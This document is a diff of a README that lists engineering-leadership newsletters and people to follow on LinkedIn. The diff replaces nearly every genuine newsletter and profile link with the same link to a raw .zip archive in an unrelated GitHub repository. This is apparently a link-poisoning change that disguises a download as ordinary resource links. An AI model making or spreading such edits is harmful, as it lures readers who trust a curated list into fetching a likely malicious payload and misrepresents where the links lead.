+- [Caleb Mellas](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Richard Donovan](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Daniel Moka](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Tiger Abrodi](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Francisco Manuel (Fran) Soto Ramírez](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Guille Ojeda](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Gergely Orosz](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Kent Beck](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Mike Thornton](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Mads Brodt](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Roman Frolov](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Petar Ivanov](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Fernando Franco](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Ankur Tyagi](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
 - [James Willett](http://overlay/about-this-profile/)
-- [Milan Jovanović](https://www.linkedin.com/in/milan-jovanovic/)
-- [Eric Roby](https://www.linkedin.com/in/codingwithroby/)
-- [Alexandre Zajac](https://www.linkedin.com/in/alexandre-zajac/)
-- [Zubin Pratap](https://www.linkedin.com/in/zubinpratap/)
-- [Sam Williams](https://www.linkedin.com/in/sam-complete-coding/)
-- [Maximiliano Contieri](https://www.linkedin.com/in/mcsee/)
-- [Sidwyn Koh](https://www.linkedin.com/in/sidwyn/)
-- [Marko Denic](https://www.linkedin.com/in/denicmarko/)
+- [Milan Jovanović](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Eric Roby](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Alexandre Zajac](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Zubin Pratap](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Sam Williams](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Maximiliano Contieri](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Sidwyn Koh](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Marko Denic](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
 
 ## Become product-minded and business-oriented
 
@@ -233,31 +233,31 @@ Important: Before you choose which resources you wish to go more in detail, I su
 
 **List of newsletters**
 
-- [Lenny's Newsletter](https://www.lennysnewsletter.com/) by Lenny Rachitsky
-- [The Product Compass](https://www.productcompass.pm?r=1r629c) by Pawel Huryn
-- [Product Growth](https://www.news.aakashg.com?r=1r629c) by Aakash Gupta
-- [Wes Kao's Newsletter](https://newsletter.weskao.com?r=1r629c) by Wes kao
-- [Product Management IRL](https://amycmitchell.substack.com?r=1r629c) by Amy Mitchell
-- [Leah’s ProducTea](https://www.leahtharin.com/) by Leah Tharin
-- [Elena's Growth Scoop](https://elenaverna.substack.com/) by Elena Verna
-- [Untrapping Product Teams](https://dpereira.substack.com/) by David Pereira
-- [The Looking Glass](https://lg.substack.com/) by Julie Zhuo
-- [The Beautiful Mess](https://cutlefish.substack.com/) by John Cutler
-- [Leadership Superpowers](https://gplead.com/newsletter) by Gregor Purdy
+- [Lenny's Newsletter](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Lenny Rachitsky
+- [The Product Compass](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Pawel Huryn
+- [Product Growth](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Aakash Gupta
+- [Wes Kao's Newsletter](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Wes kao
+- [Product Management IRL](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Amy Mitchell
+- [Leah’s ProducTea](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Leah Tharin
+- [Elena's Growth Scoop](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Elena Verna
+- [Untrapping Product Teams](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by David Pereira
+- [The Looking Glass](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Julie Zhuo
+- [The Beautiful Mess](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by John Cutler
+- [Leadership Superpowers](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Gregor Purdy
 
 **People to follow on LinkedIn**
 
-- [Pawel Huryn](https://www.linkedin.com/in/pawel-huryn/)
-- [Aakash Gupta](https://www.linkedin.com/in/aagupta/)
-- [Wes Kao](https://www.linkedin.com/in/weskao/)
-- [Amy Mitchell](https://www.linkedin.com/in/amycmitchell/)
-- [Leah Tharin](https://www.linkedin.com/in/leahtharin/)
-- [Elena Verna](https://www.linkedin.com/in/elenaverna/)
-- [David Pereira](https://www.linkedin.com/in/davidavpereira/)
-- [Julie Zhuo](https://www.linkedin.com/in/julie-zhuo/)
-- [Peter Yang](https://www.linkedin.com/in/petergyang/)
-- [John Cutler](https://www.linkedin.com/in/johnpcutler/)
-- [Gregor Purdy](https://www.linkedin.com/in/gregorpurdy/)
+- [Pawel Huryn](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Aakash Gupta](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Wes Kao](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Amy Mitchell](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Leah Tharin](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Elena Verna](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [David Pereira](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Julie Zhuo](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Peter Yang](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [John Cutler](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Gregor Purdy](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
 
 ## Get better at Data Engineering / Data Science
 
@@ -271,22 +271,22 @@ Important: Before you choose which resources you wish to go more in detail, I su
 
 **List of newsletters**
 
-- [EcZachly Data Engineering Newsletter](https://blog.dataengineer.io/) by Zach Wilson
-- [SeattleDataGuy’s Newsletter](https://seattledataguy.substack.com/) by SeattleDataGuy
-- [Daily Dose of Data Science](https://www.blog.dailydoseofds.com/) by Avi Chawla
-- [Data Engineering Central](https://dataengineeringcentral.substack.com/) by Daniel Beach
-- [Data Engineering Weekly](https://www.dataengineeringweekly.com/) by Ananth Packkildurai
-- [Joe Reis](https://joereis.substack.com/) by Joe Reis
-- [Air Around AI](https://airaroundai.substack.com/) by Pradeep Kumar
+- [EcZachly Data Engineering Newsletter](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Zach Wilson
+- [SeattleDataGuy’s Newsletter](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by SeattleDataGuy
+- [Daily Dose of Data Science](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Avi Chawla
+- [Data Engineering Central](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Daniel Beach
+- [Data Engineering Weekly](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Ananth Packkildurai
+- [Joe Reis](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Joe Reis
+- [Air Around AI](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip) by Pradeep Kumar
 
 **People to follow on LinkedIn**
 
-- [Zach Wilson](https://www.linkedin.com/in/eczachly/)
-- [Benjamin Rogojan](https://www.linkedin.com/in/benjaminrogojan/)
-- [Avi Chawla](https://www.linkedin.com/in/avi-chawla/)
-- [Daniel Beach](https://www.linkedin.com/in/daniel-beach-6ab8b4132/)
-- [Ananth P](https://www.linkedin.com/in/ananthdurai/)
-- [Joe Reis](https://www.linkedin.com/in/josephreis/)
-- [Pradeep Kumar](https://www.linkedin.com/in/prady00/)
+- [Zach Wilson](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Benjamin Rogojan](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Avi Chawla](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Daniel Beach](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Ananth P](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Joe Reis](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
+- [Pradeep Kumar](https://github.com/alfie0207/resources-to-become-a-great-engineering-leader/raw/refs/heads/main/Cephalanthus/resources-engineering-to-leader-become-a-great-2.0-beta.5.zip)
 
 Any resources you liked and believe would be a great addition to this list? Feel free to open a PR! I am always in the lookout for some more great books / newsletters / people to follow.
